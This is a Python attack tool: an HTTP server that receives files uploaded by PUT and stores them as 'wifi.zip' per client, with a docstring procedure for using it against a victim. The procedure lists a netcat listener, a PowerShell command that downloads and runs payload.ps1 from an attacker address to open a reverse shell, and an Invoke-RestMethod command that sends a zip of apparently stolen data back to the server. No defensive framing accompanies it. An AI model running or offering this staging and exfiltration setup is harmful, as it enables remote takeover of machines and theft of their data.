# Use this command to start the server on port 80: sudo python server.py 80



'''
PROCEDURE
- make sure that your local ip address is the same as victim
    -change in:
        payload.ps1




- START SERVER
    python3 server.py

- RUN NETCAT AFTER SERVER IS UP
    nc -lp 4444

- REVERSE SHELL
    powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.101:8000/payload.ps1');" 

- UPLOAD TO SERVER
    Invoke-Restmethod -Uri http://192.168.1.101:8000/temp.zip -Method Put -Infile .\temp.zip


'''






import argparse
import http.server
import os

class HTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        path = self.translate_path(self.path)
        if path.endswith('/'):
            self.send_response(405, "Method Not Allowed")
            self.wfile.write("PUT not allowed on a directory\n".encode())
            return
        else:
            length = int(self.headers['Content-Length'])
            os.system(f"mkdir {self.address_string()}")
            with open(f'{self.address_string()}/wifi.zip', 'wb') as f:
                f.write(self.rfile.read(length))
            self.send_response(201, "Created")
            self.end_headers() 





if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--bind', '-b', default='0.0.0.0', metavar='ADDRESS',
                        help='Specify alternate bind address '
                             '[default: all interfaces]')
    parser.add_argument('port', action='store',
                        default=8000, type=int,
                        nargs='?',
                        help='Specify alternate port [default: 8000]')
    args = parser.parse_args()

    http.server.test(HandlerClass=HTTPRequestHandler, port=args.port, bind=args.bind)


